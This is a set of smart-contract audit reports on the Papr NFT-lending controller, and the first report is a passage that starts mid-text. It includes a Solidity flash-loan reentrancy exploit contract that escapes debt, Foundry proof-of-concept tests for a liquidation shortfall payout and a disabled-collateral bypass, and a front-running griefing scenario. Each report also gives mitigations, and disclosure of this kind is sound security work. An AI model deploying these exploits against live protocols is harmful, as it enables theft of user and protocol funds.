https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L444 https://github.com/transmissions11/solmate/blob/3a752b8c83427ed1ea1df23f092ea7a810205b6c/src/tokens/ERC721.sol#L120  - In the callback, BobContract calls this function again to remove the next NFT (I mean the NFT with id 2).  - BobContract repeats this for 9 NFTs. So, when all the NFTs with id 1 to 9 are removed from the protocol, in the last callback, BobContract calls the function `startLiquidationAuction` to put the NFT with id 10 on the auction. Please note that after removal of 9 NFTs, they are transferred to BobContract, and `_vaultInfo[BobContract][collateral.addr].count = 1`. So, BobContract health factor is not solvent any more because total debt is the same as before 250k, but max debt is now 1*50k*50% = 25k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L438 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297  - After calling the function `startLiquidationAuction`, it checks whether the debt is larger than max debt or not. Since 9 NFTs were removed in the previous steps, `info.count = 1`, so debt is larger than max debt.  ``` if (info.debt < _maxDebt(oraclePrice * info.count, cachedTarget)) {             revert IPaprController.NotLiquidatable();         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L317  - Then, since this last NFT (with id 10) is going to be auctioned, the variable count will be decremented by one, so `_vaultInfo[msg.sender][collateral.addr].count = 0`. Moreover, the starting price for this NFT will be `3*oraclePrice` (because the `auctionStartPriceMultiplier = 3`), so it will be almost 3 * 50k = 150k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L326 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L341  - BobContract calls the function `purchaseLiquidationAuctionNFT` to buy it's own NFT with id 10 which is priced at almost 150k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264  - In this function, we have the followoing variables:    - `collateralValueCached ` = 150k * 0 = 0    - `isLastCollateral ` = TRUE    - `debtCached ` = 250k (same as before)    - `maxDebtCached ` = 250k    - `neededToSaveVault ` = 0    - `price ` = 150k Please note that the functions `_purchaseNFTAndUpdateVaultIfNeeded` and `_purchaseNFT` are called that takes 150k from BobContract and transfers that last NFT with id 10 to BobContract. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L519 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/NFTEDA/NFTEDA.sol#L72    - `excess ` = 150k Since it is larger than zero, the function `_handleExcess` is called. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L532    - `fee ` = 15k Considering 10% fee on the excess    - `credit` = 135k    - `totalOwed ` = 135k Since this is smaller than `debtCaches` 250k, the function `_reduceDebt` is called to reduce debt from 250k to 115k. https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L549    - `remaining` = 115k  - All the above calculations mean that the last NFT is sold at 150k, and 15k is considered as fee, so 135k will be deducted from the debt. Since the debt was 250k, still 115k is remained as debt.  - In the last part of the function `purchaseLiquidationAuctionNFT`, there is a check that makes the debt of BobContract equal to zero. This is the place that BobContract takes profit. It means that the debt of 115k is ignored. ``` if (isLastCollateral && remaining != 0) {             /// there will be debt left with no NFTs, set it to 0             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L290  - Now, the control returns back to the contract `PaprController`. So, it compares the debt and max for each collateral removal. Since the debt is set to zero in the previous steps, this check for all 10 NFTs will be passed. ``` if (debt > max) {             revert IPaprController.ExceedsMaxDebt(debt, max);         } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L449  - Now that the attack is finished. BobContract repays the flash loan after selling those 10 NFTs.  - ***Bob had 250k that borrowed at first, then he paid 150k to buy his own NFT with id 10 on the auction, so Bob's profit is equal to 100k. In summary, he could borrow 250k but only repaid 150k and received all his collateral.***  - Please note that taking a flash loan is not necessary, it is just to show that it can increase the attack impact much more.  - Please note that if Bob applies the same attack with only 3 NFTs (each worth 50k) and borrows 75k, he does not take any profit. Because, the last NFT should be bought 3 times the oracle price (3*50k = 150k) while the total debt was 75k.  - ***In order to take profit and steal fund, the attacker at least should add 7 NFTs as collateral and borrow the max debt. Because `numberOfNFT * oraclePrice * 50% > oraclePrice * 3`***  In the following PoC, I am showing how the attack can be applied. Bob deploys the following contract and calls the function `attack()`. It takes flash loan from AAVE, then the callback from the AAVE will execute `executeOperation`. In this function, 10 NFTs with ids 1 to 10 are bought and added as collateral to the protocol.  Then, it borrows max debt which is almost 250k, and remove the NFT with id 1.  In the callback of `safeTransferFrom`, the function `onERC721Received` is called, if the number of callback is less than 9, it repeats removal of the NFTs with ids 2 to 9, respectively.  When NFTs with id 9 is removed, the function `startLiquidationAuction` is called to auction NFT with id 10. Then, this NFT is purchased by BobContract immediately at the start price (which is defined by protocol to be 3 times larger than the oracle price). Then, after the control is returned to the protocol, BobContract sells these 10 NFTs and repays the flash loan.  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.0;  interface ERC721 {}  interface ERC20 {}  struct Collateral {     ERC721 addr;     uint256 id; } struct OracleInfo {     Message message;     Sig sig; } struct Message {     bytes32 id;     bytes payload;     uint256 timestamp;     bytes signature; } struct Sig {     uint8 v;     bytes32 r;     bytes32 s; } struct Auction {     address nftOwner;     uint256 auctionAssetID;     ERC721 auctionAssetContract;     uint256 perPeriodDecayPercentWad;     uint256 secondsInPeriod;     uint256 startPrice;     ERC20 paymentAsset; }  enum PriceKind {     SPOT,     TWAP,     LOWER,     UPPER }  interface IPaprController {     function addCollateral(Collateral[] calldata collateral) external;      function increaseDebt(         address mintTo,         ERC721 asset,         uint256 amount,         OracleInfo calldata oracleInfo     ) external;      function removeCollateral(         address sendTo,         Collateral[] calldata collateralArr,         OracleInfo calldata oracleInfo     ) external;      function startLiquidationAuction(         address account,         Collateral calldata collateral,         OracleInfo calldata oracleInfo     ) external returns (Auction memory auction);      function purchaseLiquidationAuctionNFT(         Auction calldata auction,         uint256 maxPrice,         address sendTo,         OracleInfo calldata oracleInfo     ) external;      function maxDebt(uint256 totalCollateraValue)         external         view         returns (uint256);      function underwritePriceForCollateral(         ERC721 asset,         PriceKind priceKind,         OracleInfo memory oracleInfo     ) external returns (uint256); }  interface IFundingRateController {     function updateTarget() external returns (uint256); }  interface IAAVE {     function flashLoanSimple(         address receiverAddress,         address asset,         uint256 amount,         bytes calldata params,         uint16 referralCode     ) external; }  contract BobContract {     IPaprController iPaprController;     IFundingRateController iFundingRateController;     IAAVE iAAVE;     ERC721 nftCollectionAddress;     ERC20 paprToken;     Collateral[] collaterals;     OracleInfo oracleInfo;     uint256 numOfCallback;     address USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;      constructor(         address _paprControllerAddress,         address _fundingRateControllerAddress,         address _aaveAddress,         ERC721 _nftCollectionAddress,         OracleInfo memory _oracleInfo,         ERC20 _paprToken     ) {         iPaprController = IPaprController(_paprControllerAddress);         iFundingRateController = IFundingRateController(             _fundingRateControllerAddress         );         iAAVE = IAAVE(_aaveAddress);         nftCollectionAddress = _nftCollectionAddress;         oracleInfo = _oracleInfo;         paprToken = _paprToken;     }      function attack() public {         ///// STEP1: taking flash loan         iAAVE.flashLoanSimple(address(this), USDC, 10 * 50000 * 10**6, "", 0);     }      function executeOperation(         address[] calldata assets,         uint256[] calldata amounts,         uint256[] calldata premiums,         address initiator,         bytes calldata params     ) external returns (bool) {         ///// STEP2: buying 10 NFTs          // Buy 10 NFTs that each worths almost 50k         // Assume the ids are from 1 to 10          ///// STEP3: adding the NFTs as collateral         for (uint256 i = 0; i < 10; ++i) {             collaterals.push(Collateral({addr: nftCollectionAddress, id: i}));         }         iPaprController.addCollateral(collaterals);          ///// STEP4: borrowing as much as possible         uint256 oraclePrice = iPaprController.underwritePriceForCollateral(             nftCollectionAddress,             PriceKind.LOWER,             oracleInfo         );          uint256 maxDebt = iPaprController.maxDebt(10 * oraclePrice);          iPaprController.increaseDebt(             address(this),             nftCollectionAddress,             maxDebt,             oracleInfo         );          ///// STEP5: removing the NFT with id 1         Collateral[] memory collateralArr = new Collateral[](1);         collateralArr[0] = Collateral({addr: nftCollectionAddress, id: 1});         iPaprController.removeCollateral(             address(this),             collateralArr,             oracleInfo         );          ///// STEP16: selling 10 NFTs and repaying the flash loan          // Selling the 10 NFTs         // Repaying the flash loan     }      function onERC721Received(         address from,         address,         uint256 _id,         bytes calldata data     ) external returns (bytes4) {         numOfCallback++;         if (numOfCallback < 9) {             ///// STEP6 - STEP13: removing the NFTs with id 2 to 9             Collateral[] memory collateralArr = new Collateral[](1);             collateralArr[0] = Collateral({                 addr: nftCollectionAddress,                 id: _id + 1             });             iPaprController.removeCollateral(                 address(this),                 collateralArr,                 oracleInfo             );         } else {             ///// STEP14: starting the auction for NFT with id 10             Collateral memory lastCollateral = Collateral({                 addr: nftCollectionAddress,                 id: _id + 1             });             iPaprController.startLiquidationAuction(                 address(this),                 lastCollateral,                 oracleInfo             );              ///// STEP15: buying the NFT with id 10 on the auction             uint256 oraclePrice = iPaprController.underwritePriceForCollateral(                 nftCollectionAddress,                 PriceKind.LOWER,                 oracleInfo             );             uint256 startPrice = (oraclePrice * 3 * 1e18) /                 iFundingRateController.updateTarget();              Auction memory auction = Auction({                 nftOwner: address(this),                 auctionAssetID: 10,                 auctionAssetContract: nftCollectionAddress,                 perPeriodDecayPercentWad: 0.7e18,                 secondsInPeriod: 1 days,                 startPrice: startPrice,                 paymentAsset: paprToken             });              iPaprController.purchaseLiquidationAuctionNFT(                 auction,                 startPrice,                 address(this),                 oracleInfo             );         }     } }  ```  ## Tools Used  ## Recommended Mitigation Steps  - Adding a reentrancy guard to the involved functions can be a solution.
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264-L294   # Vulnerability details  ## Impact The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.  ## Proof of Concept  Assume N is an allowed NFT, B is a borrower, the vault V is `_vaultInfo[B][N]`:  1. B add two NFTs(N-1 and N-2) as collaterals to vault V. 2. B [increaseDebt()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138) of vault V. 3. The vault V becomes liquidatable 4. Someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-1. 5. No one buys N-1 because the price of N is falling 6. After [liquidationAuctionMinSpacing - 2days](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41), someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-2 7. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:   ```solidity   if (isLastCollateral && remaining != 0) {       /// there will be debt left with no NFTs, set it to 0       _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);   }   ``` 8. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-2. All the excess will be transferred to B because `neededToSaveVault` is 0 and `debtCached` is 0:   ```solidity   if (excess > 0) {       remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);   }   ```  **The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.** Test code for PoC: ```solidity diff --git a/test/paprController/PoC.sol b/test/paprController/PoC.sol new file mode 100644 index 0000000..0b12914 --- /dev/null +++ b/test/paprController/PoC.sol @@ -0,0 +1,147 @@ +// SPDX-License-Identifier: GPL-2.0-or-later +pragma solidity ^0.8.17; + +import "forge-std/console.sol"; +import {ERC721} from "solmate/tokens/ERC721.sol"; + +import {ReservoirOracleUnderwriter} from "../../src/ReservoirOracleUnderwriter.sol"; +import {INFTEDA} from "../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol"; + +import {BasePaprControllerTest} from "./BasePaprController.ft.sol"; +import {IPaprController} from "../../src/interfaces/IPaprController.sol"; + +contract PoC is BasePaprControllerTest { +    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount); +    event Transfer(address indexed from, address indexed to, uint256 amount); + +    INFTEDA.Auction auction1; +    INFTEDA.Auction auction2; +    address purchaser = address(2); + +    function setUp() public override { +        super.setUp(); + +        // mint a second collateral +        nft.mint(borrower, collateralId+1); +        // add collaterals, loan max and sells +        _addCollaterals(); +        _loanMaxAndSell(); +        // borrower now has 2.9... USD +        assertGt(underlying.balanceOf(borrower), 2.9e6); + +        // prepare purchaser +        vm.startPrank(purchaser); +        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) - 10; +        safeTransferReceivedArgs.proceedsTo = purchaser; +        safeTransferReceivedArgs.swapParams.minOut = 0; +        for (uint i = 0; i < 3; i ++) { +            nft.mint(purchaser, 10+i); +            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs)); +        } +        vm.stopPrank(); +        // purchaser now has 4.4... papr +        assertGt(debtToken.balanceOf(purchaser), 4.4e18); + +        // make max loan liquidatable +        vm.warp(block.timestamp + 1 days); +        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP; +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +    } + +    function testPoC() public { +        vm.startPrank(purchaser); +        debtToken.approve(address(controller), type(uint256).max); + +        // start auction1, collateralId +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo); + +        // nobody purchage auction1 for some reason(like nft price falling) + +        // start auction2, collateralId+1 +        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing()); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        auction2 = controller.startLiquidationAuction( +            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo); + +        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr); +        assertGt(info.debt, 2.99e18); + +        // purchase auction1 +        uint256 beforeBalance = debtToken.balanceOf(borrower); +        uint256 price = controller.auctionCurrentPrice(auction1); +        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4; +        uint256 reduced = price - penalty; +        uint256 shortfall = info.debt - reduced; +        // burn penalty +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), penalty); +        // reduce debt (partial) +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, reduced); +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), reduced); +        //!! burning the shortfall debt not covered by auction +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, shortfall); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo); + +        // reduced: 0.65.. +        assertLt(reduced, 0.66e18); +        // fortfall: 2.34.. +        assertGt(shortfall, 2.34e18); +        //!! debt is 0 now +        info = controller.vaultInfo(borrower, collateral.addr); +        assertEq(info.debt, 0); + +        // purchase auction2 +        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29 +        vm.warp(block.timestamp + 78831); +        beforeBalance = debtToken.balanceOf(borrower); +        price = controller.auctionCurrentPrice(auction2); +        penalty = price * controller.liquidationPenaltyBips() / 1e4; +        uint256 payouts = price - penalty; +        // burn penalty +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), penalty); +        //!! reduce 0 because debt is 0 +        vm.expectEmit(true, false, false, true); +        emit ReduceDebt(borrower, collateral.addr, 0); +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), address(0), 0); +        //!! borrower get the payouts that should be used to reduce the shortfall debt +        vm.expectEmit(true, true, false, true); +        emit Transfer(address(controller), borrower, payouts); +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo); + +        //!! borrower wins +        uint256 afterBalance = debtToken.balanceOf(borrower); +        assertEq(afterBalance - beforeBalance, payouts); +        assertGt(payouts, 2.4e18); +    } + +    function _addCollaterals() internal { +        vm.startPrank(borrower); +        nft.setApprovalForAll(address(controller), true); +        IPaprController.Collateral[] memory c = new IPaprController.Collateral[](2); +        c[0] = collateral; +        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft}); +        controller.addCollateral(c); +        vm.stopPrank(); +    } + +    function _loanMaxAndSell() internal { +        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying); +        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({ +            amount: controller.maxDebt(oraclePrice*2) - 4, +            minOut: 1, +            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}), +            swapFeeTo: address(0), +            swapFeeBips: 0 +        }); +        vm.prank(borrower); +        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo); +    } +} ```  Test output: ``` Running 1 test for test/paprController/PoC.sol:PoC [PASS] testPoC() (gas: 720941) Test result: ok. 1 passed; 0 failed; finished in 1.21s ```  ## Tools Used VS Code  ## Recommended Mitigation Steps  The debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.  Implementation code: ```solidity diff --git a/src/PaprController.sol b/src/PaprController.sol index 284b3f4..d7e4cea 100644 --- a/src/PaprController.sol +++ b/src/PaprController.sol @@ -61,6 +61,8 @@ contract PaprController is       /// @dev account => asset => vaultInfo      mapping(address => mapping(ERC721 => IPaprController.VaultInfo)) private _vaultInfo; +    /// @dev account => asset => shortfall amount +    mapping(address => mapping(ERC721 => uint256)) private _shortfall;       /// @dev does not validate args      /// e.g. does not check whether underlying or oracleSigner are address(0) @@ -288,6 +290,8 @@ contract PaprController is          }           if (isLastCollateral && remaining != 0) { +            // increase shortfall +            _shortfall[auction.nftOwner][auction.auctionAssetContract] += remaining;              /// there will be debt left with no NFTs, set it to 0              _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);          } @@ -408,6 +412,10 @@ contract PaprController is          return _vaultInfo[account][asset];      }  +    function shortfall(address account, ERC721 asset) external view returns (uint256) { +        return _shortfall[account][asset]; +    } +      /// INTERNAL NON-VIEW ///       function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal { @@ -543,7 +551,20 @@ contract PaprController is              // we owe them more papr than they have in debt              // so we pay down debt and send them the rest              _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), debtCached); -            papr.transfer(auction.nftOwner, totalOwed - debtCached); + +            uint256 payout = totalOwed - debtCached; +            uint256 burnShortfall = _shortfall[auction.nftOwner][auction.auctionAssetContract]; +            if (burnShortfall >= payout) { +                burnShortfall = payout; +            } +            if (burnShortfall > 0) { +                // burn the previous shortfall +                PaprToken(address(papr)).burn(address(this), burnShortfall); +                _shortfall[auction.nftOwner][auction.auctionAssetContract] -= burnShortfall; +            } +            if (payout > burnShortfall) { +                papr.transfer(auction.nftOwner, payout - burnShortfall); +            }          } else {              // reduce vault debt              _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), totalOwed); ``` 
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486   # Vulnerability details  ## Impact  An attacker can apply grieving attack by preventing users from interacting with some of the protocol functions. In other words whenever a user is going to reduce his debt, or buy and reduce his debt in one tx, it can be failed by the attacker.  ## Proof of Concept In the following scenario, I am explaining how it is possible to fail user's transaction to reduce their debt fully. Failing other transaction (buy and reduce the debt in one tx) can be done similarly.   - Suppose Alice (an honest user) has debt of 1000 `PaprToken` and she intends to repay her debt fully:   - So, she calls the function `reduceDebt` with the following parameters:    - `account`: Alice's address    - `asset`: The NFT which was used as collateral    - `amount`: 1000 * 10**18 (decimal of `PaprToken` is 18). ``` function reduceDebt(address account, ERC721 asset, uint256 amount) external override {         _reduceDebt({account: account, asset: asset, burnFrom: msg.sender, amount: amount});     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L148  - Bob (a malicious user who owns a small amount of `PaprToken`) notices Alice's transaction in the Mempool. So, Bob applies front-run attack and calls the function `reduceDebt` with the following parameters:    - `account`: Alice's address    - `asset`: The NFT which was used as collateral    - `amount`: 1  - By doing so, Bob repays only **1** `PaprToken` on behalf of Alice, so Alice's debt becomes `1000 * 10**18 - 1`. ``` function _reduceDebt(address account, ERC721 asset, address burnFrom, uint256 amount) internal {         _reduceDebtWithoutBurn(account, asset, amount);         PaprToken(address(papr)).burn(burnFrom, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L481 ``` function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {         _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);         emit ReduceDebt(account, asset, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486  - Then, when Alice's transaction is going to be executed, it fails because of `Underflow Error`. Since Alice's debt is `1000 * 10**18 - 1` while Alice's transaction was going to repay `1000 * 10**18`. ``` _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount); ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L487  - Bob only pays a very small value of 1 `PaprToken` (consider that the decimal is 18) to apply this grieving attack.  - Bob can repeat this attack for Alice, if Alice is going to call this function again with correct parameter.  ***In summary, Bob could prevent the user from paying her debt fully by just repaying a very small amount of the user's debt in advance and as a result causing underflow error. Bob can apply this attack for all other users who are going to repay their debt fully. Please note that if a user is going to repay her debt partially, the attack can be expensive and not financially reasonable, but in case of full repayment of debt, it is very cheap to apply this grieving attack.***  ***This attack can be applied on the transactions that are going to interact with the function `_reduceDebt`. The transactions interacting with this specific function are:***  - `buyAndReduceDebt(...)` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L229  - `reduceDebt(...)` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L149  ***It means that the attacker can prevent users from calling the functions above.***  ## Tools Used  ## Recommended Mitigation Steps The following condition should be added to the function `_reduceDebtWithoutBurn`: ``` function _reduceDebtWithoutBurn(address account, ERC721 asset, uint256 amount) internal {         if(amount > _vaultInfo[account][asset].debt){             amount = _vaultInfo[account][asset].debt;         }         _vaultInfo[account][asset].debt = uint200(_vaultInfo[account][asset].debt - amount);         emit ReduceDebt(account, asset, amount);     } ``` https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L486
# Lines of code  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L365 https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138   # Vulnerability details  ## Impact  Disabled collateral can still be used to mint debt  ## Proof of Concept  There is a access control function in PaprController.sol  ```solidity /// @inheritdoc IPaprController function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs)  external  override  onlyOwner { ```  According to IPaprController, if the collateral is disabled set to false, the user should not be allowed to mint debt using the collateral,  ```solidity /// @notice sets whether a collateral is allowed to be used to mint debt /// @dev owner function /// @param collateralConfigs configuration settings indicating whether a collateral is allowed or not function setAllowedCollateral(IPaprController.CollateralAllowedConfig[] calldata collateralConfigs) external; ```  However, the code only checks if the collateral is allowed when adding collateral,   ```solidity function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {  if (!isAllowed[address(collateral.addr)]) {   revert IPaprController.InvalidCollateral();  } ```  but does not have the same check when minting debt, then user can use diabled collateral to mint debt.  ```solidity function _increaseDebt(  address account,  ERC721 asset,  address mintTo,  uint256 amount,  ReservoirOracleUnderwriter.OracleInfo memory oracleInfo ) internal {  uint256 cachedTarget = updateTarget();   uint256 newDebt = _vaultInfo[account][asset].debt + amount;  uint256 oraclePrice =   underwritePriceForCollateral(asset, ReservoirOracleUnderwriter.PriceKind.LOWER, oracleInfo);   uint256 max = _maxDebt(_vaultInfo[account][asset].count * oraclePrice, cachedTarget);   if (newDebt > max) revert IPaprController.ExceedsMaxDebt(newDebt, max);   if (newDebt >= 1 << 200) revert IPaprController.DebtAmountExceedsUint200();   _vaultInfo[account][asset].debt = uint200(newDebt);  PaprToken(address(papr)).mint(mintTo, amount);   emit IncreaseDebt(account, asset, amount); } ```  As shown in the coded POC  We can add the following test to increaseDebt.t.sol  https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/test/paprController/IncreaseDebt.t.sol#L32  ```solidity function testIncreaseDebt_POC() public {   uint256 debt = 10 ether;  // console.log(debt);   vm.assume(debt < type(uint200).max);  vm.assume(debt < type(uint256).max / controller.maxLTV() / 2);   oraclePrice = debt * 2;  oracleInfo = _getOracleInfoForCollateral(nft, underlying);    vm.startPrank(borrower);  nft.approve(address(controller), collateralId);  IPaprController.Collateral[] memory c = new IPaprController.Collateral[](1);  c[0] = collateral;   controller.addCollateral(c);   // disable the collateral but still able to mint debt  IPaprController.CollateralAllowedConfig[] memory args = new IPaprController.CollateralAllowedConfig[](1);  args[0] = IPaprController.CollateralAllowedConfig({   collateral: address(collateral.addr),   allowed: false  });   vm.stopPrank();   vm.prank(controller.owner());  controller.setAllowedCollateral(args);   vm.startPrank(borrower);   controller.increaseDebt(borrower, collateral.addr, debt, oracleInfo);  assertEq(debtToken.balanceOf(borrower), debt);  assertEq(debt, controller.vaultInfo(borrower, collateral.addr).debt); } ```  We disable the collateral but still able to mint debt by calling increaseDebt  We run the test   ```solidity forge test -vvv --match testIncreaseDebt_POC ```  The test pass, but the test should revert.  ``` Running 1 test for test/paprController/IncreaseDebt.t.sol:IncreaseDebtTest [PASS] testIncreaseDebt_POC() (gas: 239301) Test result: ok. 1 passed; 0 failed; finished in 237.42ms ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  We recommend the project add check to make sure when the collateral is disabled, the collateral should not be used to mint debt  ```solidity if (!isAllowed[address(collateral.addr)]) {  revert IPaprController.InvalidCollateral(); } ```
